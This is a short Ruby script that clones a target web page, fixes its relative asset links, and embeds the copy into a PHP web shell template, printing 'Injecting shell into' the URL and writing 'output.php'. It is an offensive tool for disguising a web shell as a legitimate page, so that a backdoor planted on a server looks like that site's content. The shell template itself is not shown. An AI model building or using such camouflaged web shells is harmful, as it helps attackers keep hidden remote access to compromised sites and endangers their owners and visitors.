#!/usr/bin/env ruby
#
require 'open-uri'
require 'rubygems'
require 'erb'
require 'mechanize'
require 'uri'

@agent = Mechanize.new()
@agent.user_agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
url = ARGV[0]

baseurl = URI(url).scheme + "://" + URI(url).host

puts "Injecting shell into #{url}"

begin
	page_raw = @agent.get(url).body()
rescue Mechanize::ResponseCodeError => ex
	page_raw = ex.page.body
end

page_html = Nokogiri::HTML(page_raw)

fixes = 0

tree = {
	"src" => ["img","script","iframe"],
	"href" => ["link","a"]
}

tree.each do |src_type,asset_types|
	asset_types.each do |asset_type|
		page_html.css(asset_type).each do |asset|
			begin
				if asset[src_type][0..3] != "http" and asset[src_type][0..1] == "//"
					asset[src_type] = "http:" + asset[src_type]
					fixes += 1
				elsif asset[src_type][0] == "/"
					asset[src_type] = baseurl + asset[src_type]
					fixes += 1
				elsif asset[src_type][0..1] == ".."
					asset[src_type] = url + asset[src_type]
					fixes += 1
				end
			rescue
			end
		end
	end
end

puts "Fixed #{fixes} dependency issues"

$page = page_html.to_html

shell = File.open("shell.php", "r").read()
result = ERB.new(shell).result()
output = "output.php"

File.open(output, "w") { |file| file.write(result) }
puts "Page injected to #{output}"